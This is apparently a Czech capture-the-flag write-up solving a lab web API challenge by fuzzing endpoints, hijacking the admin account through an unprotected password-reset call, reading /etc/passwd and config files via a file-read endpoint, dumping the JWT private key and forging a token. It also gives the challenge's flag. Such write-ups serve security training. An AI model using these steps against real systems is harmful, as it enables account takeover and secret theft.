# U.S.A. (5)

## Zadání

Ahoy, officer,

on our last port visit, a new U.S.A. (Universal Ship API) interface was installed on the ship. In order to unlock new experimental ship functions, the special code has to be entered into ship FLAG (First Layer Application Gateway). Your task is to get this FLAG code from U.S.A.

May you have fair winds and following seas!

The U.S.A. is available at <http://universal-ship-api.cns-jv.tcc>.

## Nápovědy (Hints)

1. Status codes 4xx can be helpful.
1. The U.S.A. appliance restarts every hour.

## Řešení

K řešení této úlohy je potřeba připojení pomocí VPN z úlohy [VPN access](../01_VPN_access/README.md)

Webová stránka ze zadání zobrazí JSON odpověď\

```json
{
    "msg":"Naval ship API version 1.0"
}
```

Zřejmě se jedná o server s API funkcemi, ale protože neznáme jejich definici je nutné zjistit další části URL hrubou silou. K tomu je vhodný program [ffuf](https://github.com/ffuf/ffuf), který je dostupný i pomocí `apt` v Kali Linuxu. Dále potřebujeme přiměřeně velký slovník. Například [big.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt).

`ffuf -w big.txt -u http://universal-ship-api.cns-jv.tcc/FUZZ`

Program nelezl `api` a `docs`. Adresa <http://universal-ship-api.cns-jv.tcc/docs> vrátí JSON odpověď

```json
{
    "detail":"Not authenticated"
}
```

Adresa <http://universal-ship-api.cns-jv.tcc/api> vrátí JSON odpověď

```json
{
    "endpoints":[
        "v1"
    ]
}
```

Adresa <http://universal-ship-api.cns-jv.tcc/api/v1> vrátí

```json
{
    "endpoints": [
        "user",
        "admin"
    ]
}
```

Na endpoint `user` znovu spustíme `ffuf`.

`ffuf -w big.txt -u http://universal-ship-api.cns-jv.tcc/api/v1/user/FUZZ -mc all -fc 401`

Nebylo nalezeno niz zajímavého. Zkusíme místo metody GET metodu POST

`ffuf -w big.txt -u http://universal-ship-api.cns-jv.tcc/api/v1/user/FUZZ -X POST -mc all -fc 405`

Program nalezl `login` a `signup`.

Asi budeme potřebovat zaregistrovat účet.

```text
curl -v 'http://universal-ship-api.cns-jv.tcc/api/v1/user/signup' \
--header 'Content-Type: application/json' \
--data '{}'
```

Odpověď

```json
{
    "detail": [
        {
            "loc": [
                "body",
                "email"
            ],
            "msg": "field required",
            "type": "value_error.missing"
        },
        {
            "loc": [
                "body",
                "password"
            ],
            "msg": "field required",
            "type": "value_error.missing"
        }
    ]
}
```

Teď víme, jak data formátovat.

```text
curl -v 'http://universal-ship-api.cns-jv.tcc/api/v1/user/signup' \
--header 'Content-Type: application/json' \
--data-raw '{
    "email": "engycz@engycz.cz",
    "password": "engycz"
}'
```

Vrátí se nám prázdná JSON data `{}` a návratový kód `201 Created`.

Zkusíme se přihlásit

```text
curl -v 'http://universal-ship-api.cns-jv.tcc/api/v1/user/login' \
--header 'Content-Type: application/json' \
--data '{}'
```

Odpověď

```json
{
    "detail": [
        {
            "loc": [
                "body",
                "username"
            ],
            "msg": "field required",
            "type": "value_error.missing"
        },
        {
            "loc": [
                "body",
                "password"
            ],
            "msg": "field required",
            "type": "value_error.missing"
        }
    ]
}
```

```text
curl --location 'http://universal-ship-api.cns-jv.tcc/api/v1/user/login' \
--header 'Content-Type: application/json' \
--data-raw '{
    "username": "engycz@engycz",
    "password": "engycz"
}'
```

Odpověď je ale stejná

```json
{
    "detail": [
        {
            "loc": [
                "body",
                "username"
            ],
            "msg": "field required",
            "type": "value_error.missing"
        },
        {
            "loc": [
                "body",
                "password"
            ],
            "msg": "field required",
            "type": "value_error.missing"
        }
    ]
}
```

Různými pokusy jsem došel k tomu, že místo JSON formátu je nutné přenést přihlašovací údaje pomocí `form-data`. Není zřejmé, proč tomu tak je, když všechna předchozí i další komunikace i odpověď probíhá prostřednictvím JSONu.

```text
curl --location 'http://universal-ship-api.cns-jv.tcc/api/v1/user/login' \
--form 'username="engycz@engycz.cz"' \
--form 'password="engycz"'
```

Odpověď

```json
{
    "access_token": "eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3MjI2Mjk4LCJpYXQiOjE2OTY1MzUwOTgsInN1YiI6IjIiLCJhZG1pbiI6ZmFsc2UsImd1aWQiOiI0ZDgzOWU0YS02NTBkLTQ0MzMtYjMxOS0yZjRiYzAwYThmOGEifQ.YqXayYIPCUu9i8fjbRq1g9WtqJNkzTaYKo1FEtJW5XJxp1dvXjGkK-eBk_Nt1-n-fEjd1UUafjlJQMO_nkBGnHOeWR_b2hOzcgd7OpoHZe03Ad8UZ2bHxEM882eAq8HFsgXr8KXh_iWBPn1t8OBYM9d8YfgzYQobyinQR916_ddFCn-SuUUa0TJ9ORaSAmtSeJQz47L6E52dThz0h8PuQucqvr5S6iuLLyh4hiEliZ0KvXLtNaCMXiON4gLKlykXtXyT1-lPeRCItYsBhvUFc4uH8W4hzD4gGU4v8lqjVTstu53AFnduSo0_ZtJxcXr8QmGU4PN5QaHG_0AaavC-VOWeML27aN9MG7M3K6hUfnB-2dJswdf59VUApU9REUQcQs9TUkrORVybK3txr4P7ld8WphKK587yzfabgWrUQSauWydWrc5GsUAtoZZjdAG1XbBmHbLieG9VRDjlJJBLQlQx_v5mqBGCI3v8l96Ea70Gk9DCUqtPMqf3ohtKKcxxzGjoIZnUx3iQO0I2Dkkx0uAHG-4ILamTkB2q-RNC89Nr62ikHPkmkC9QJWaSOrFVby7EUsQou2Cb3w4qaqXHzqtRu1-Uu2g7y5atodcvoNSAhFj-KjwLy1_KpEgJmceYAzci6oCk3NVSxWEFMfNygvtZ8rpInBBYhaPDazoEMeA",
    "token_type": "bearer"
}
```

Odpověď převedeme na hlavičku HTML požadavku

`Authorization: bearer eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3MjI2Mjk4LCJpYXQiOjE2OTY1MzUwOTgsInN1YiI6IjIiLCJhZG1pbiI6ZmFsc2UsImd1aWQiOiI0ZDgzOWU0YS02NTBkLTQ0MzMtYjMxOS0yZjRiYzAwYThmOGEifQ.YqXayYIPCUu9i8fjbRq1g9WtqJNkzTaYKo1FEtJW5XJxp1dvXjGkK-eBk_Nt1-n-fEjd1UUafjlJQMO_nkBGnHOeWR_b2hOzcgd7OpoHZe03Ad8UZ2bHxEM882eAq8HFsgXr8KXh_iWBPn1t8OBYM9d8YfgzYQobyinQR916_ddFCn-SuUUa0TJ9ORaSAmtSeJQz47L6E52dThz0h8PuQucqvr5S6iuLLyh4hiEliZ0KvXLtNaCMXiON4gLKlykXtXyT1-lPeRCItYsBhvUFc4uH8W4hzD4gGU4v8lqjVTstu53AFnduSo0_ZtJxcXr8QmGU4PN5QaHG_0AaavC-VOWeML27aN9MG7M3K6hUfnB-2dJswdf59VUApU9REUQcQs9TUkrORVybK3txr4P7ld8WphKK587yzfabgWrUQSauWydWrc5GsUAtoZZjdAG1XbBmHbLieG9VRDjlJJBLQlQx_v5mqBGCI3v8l96Ea70Gk9DCUqtPMqf3ohtKKcxxzGjoIZnUx3iQO0I2Dkkx0uAHG-4ILamTkB2q-RNC89Nr62ikHPkmkC9QJWaSOrFVby7EUsQou2Cb3w4qaqXHzqtRu1-Uu2g7y5atodcvoNSAhFj-KjwLy1_KpEgJmceYAzci6oCk3NVSxWEFMfNygvtZ8rpInBBYhaPDazoEMeA`

HTML hlavičku přidáme pomocí Firefox doplňku [Modify Header Value](https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/) pro server <http://universal-ship-api.cns-jv.tcc/docs>. Po otevření stránky <http://universal-ship-api.cns-jv.tcc/docsv> se zobrazí detailní popis API funkcí s možností jejich volání.

![Alt text](image.png)

Zkusíme `/api/v1/admin/` - `Returns true if the user is in admin role`.

```json
{
    "results": false
}
```

Nejsme admin. Zkusíme zjistit něco o uživateli `admin` pomocí `/api/v1/user/{user_id}` - `Fetch a user by ID` postupným zadáváním `user_id`. To se nám podaří při id 1.

```json
{
    "guid": "45b51c15-6237-4bb5-a17f-0d452fd7a2ce",
    "email": "admin@local.tcc",
    "date": null,
    "time_created": 1690796892351,
    "admin": true,
    "id": 1
}
```

Zkusíme změnit heslo pomocí funkce `/api/v1/user/updatepassword` - `Update a user password` pro uživatele `admin@local.tcc`, který má guid `45b51c15-6237-4bb5-a17f-0d452fd7a2ce`.

Heslo se podařilo nastavit. Přihlásíme se jako uživatel `admin@local.tcc` se změněným heslem. Úspěch, máme nový token, který nastavíme do doplňku Firefoxu.

```json
{
    "access_token": "eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3MjI4MzIxLCJpYXQiOjE2OTY1MzcxMjEsInN1YiI6IjEiLCJhZG1pbiI6dHJ1ZSwiZ3VpZCI6IjQ1YjUxYzE1LTYyMzctNGJiNS1hMTdmLTBkNDUyZmQ3YTJjZSJ9.aFg94JLrrYt-ZqAfaeWnxRKU8cg378lQsYKDaEzuJ4guNr1zhPnaFR5aiHosd_ararRneZkWCY57dJq8aiyojZq0UASiuNO9r0iLOFMKC0ChjX7ijqumnE_t7m20G6ETEm5og7f7xDf-drvoEm7Gi8jDv7qtFKhKZdLEp_RvAfmM0zYpAPir2PY6ssVwJ5eCrDEdgzfsCNw-GBxwaXQ0lpHTpK1gCLN-VKQ5llz4kbhlLMM48EutjMamvkIRqw5e0Mgz323xKwk15QeJsImJ8rQZocXmWf3IbZNKTUUjFffOzmBRK791KGhDdYfTw63zeHZEL_K2DVjPyXq2sztK7kuKIrOZGBZv9EBrFnO9Z8d3kmMh6NIk0oEJuz7FRtBwNceWvdXONvQk5PjCjc6YSpIbUAPE_owI1cY3fsV1cMQCx7Q9xEHkF6PtNxl4bKPqHrNLPUuBKg-9x8fZMgK4ROSKAork2M5z6t03jwRLjVLop3BeCjgvy8F90r7E23C9vCfa4e8LIrTpg-Tb2brWePYC_yqyGTyfD6s2IZxhlvDVsx91eZpuSpYzAjbGQW3DOdRbJuJI4tW7q9oVJbmuBsAr7ffXVzLX04tnsMRQDZGTn7qpsVEoNG2vcjdFnBhfoTJfOpwc1hZAl0VHPdt-_jw54NLrSKltJWZ86TzwMQk",
    "token_type": "bearer"
}
```

Nyní již kontrola `/api/v1/admin` vrátí kladnou odpověď

```json
{
    "results": true
}
```

Funkce `/api/v1/admin/getFlag` - `The Flag` ale vrací chybu

```json
{
    "detail": "flag-read key missing from JWT"
}
```

Token po přihlášení je JWT token. Zobrazíme si obsah token na stránce <https://jwt.io/>.

```json
{
    "type": "access_token",
    "exp": 1697228321,
    "iat": 1696537121,
    "sub": "1",
    "admin": true,
    "guid": "45b51c15-6237-4bb5-a17f-0d452fd7a2ce"
}
```

Abychom mohli do JWT tokenu přidat požadovaný `flag-read` je potřeba znát privátní šifrovací klíč, kterým se JWT token vytváří.

API ještě nabízí funkci `/api/v1/admin/file` - `Returns a file on the server`

Soubor `/etc/passwd` se podařilo přečíst, takže funkce funguje.

Soubor `/proc/self/environ` obsahuje

```text
HOSTNAME=65d54113d3d0
PYTHON_VERSION=3.10.13
APP_MODULE=shipapi.main:app
PWD=/app
PORT=80
PYTHON_SETUPTOOLS_VERSION=65.5.1
TZ=Europe/Prague
HOME=/home/appuser
LANG=C.UTF-8
VIRTUAL_ENV=/app/venv
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
PYTHONPATH=.
HOST=0.0.0.0
SHLVL=0
PYTHON_PIP_VERSION=23.0.1
VIRTUAL_ENV_PROMPT=(venv)
PYTHON_GET_PIP_SHA256=45a2bb8bf2bb5eff16fdd00faef6f29731831c7c59bd9fc2bf1f3bed511ff1fe
PS1=(venv)
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/9af82b715db434abb94a0a6f3569f43e72157346/public/get-pip.py
PATH=/app/venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Z proměnné `APP_MODULE` je vidět, že je spuštěna python aplikace `shipapi/main.py`. Když tento soubor vyčteme je mezi importy i řádka

`from shipapi.appconfig.config import settings`

Vyčteme soubor `shipapi/appconfig/config.py`. V něm jsou zajímavé řádky

```python
    JWT_RSA_KEY =  open('shipapi/appconfig/jwtsigning.key').read()
    JWT_RSA_PUB = open('shipapi/appconfig/jwtsigning.pub').read()
    ALGORITHM: str = "RS384"
```

Vyčteme si oba soubory

```text
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

```text
-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAzZ9oqXFgfAkwkHpaJebs4JB1fPRcMcg8zprGPzgh6HQuSEGNzW0o
f5Sf5HPg6vVPBlGGKjg4YeHH+PNo6I8Oa+s6mmA8Nj5l1bgp7WXgB8GTUQmA1yjG
HAvd2p5Bs0VBS/92EkGCRX0OUmKuM7eNI3FLmZ/A0lCXeFS/LSGw0CQ7yIImWIbp
XGqSKkOtKz9E+r2eckxEBPUmPs7uL41aJgFrukQjiPjEG4CjUWxv53o7oiodC+fb
PoS+mK0wRfLjIodl0V3dCm/P4IzB5a8qVozCIwzmLZW12ZjgFt3JrsP6oJxWqmZ8
2gmt+ps9Zaabg0+797hwfJWmpLtEhtl3gG21w37hVIU9BYSu/tSXEYMQ5G3i1afg
Su1rp8KsldnZTyYVyHXfGC5rZNRh7dnrYR/SzREH1x5mvTAYqgZk9c732cP5yS8q
RzMGyQCBWOvmXSX1WEpjy3zSXwh/QDH0jeuHH/TrcvOeFdqbAlVdjiM6pStc3uIc
1l+Ik4s0d4htUiMW9OQ5hW1qOAFZedQlnXLKBgNxI/0E08XXoGE3mVHcR1352QjO
kfOA8ICwCzNtIgQQKx+jDVWkMZrmUL+W6+/zFV8pTp9HrL/1gx+kLbyB2CfwLbRn
PychfePyOqD9kbLR2tyh5jTLminOV5+sLsbCrwHaNmLNY0rIzQxxzZcCAwEAAQ==
-----END RSA PUBLIC KEY-----
```

Jejich obsah vyplníme na stránce <https://jwt.io/> k dříve načtenému tokenu. Kontrola integrity je nyní v pořádku `Signature Verified`, takže klíče jsou správně. Do dat tokenu doplníme `"flag-read": true` a vygenerovaný token zkopírujeme do doplňku ve Firefoxu.

Po zavolání funkce `/api/v1/admin/getFlag` - `The Flag` je už vrácen hledaný FLAG.

[source.zip](source.zip) obsahuje zdrojový kód aplikace (funguje s `fastapi<=0.88.0`, spuštění pomocí `uvicorn`).

## Flag

`FLAG{910P-iUeJ-Wwq1-i8L2}`
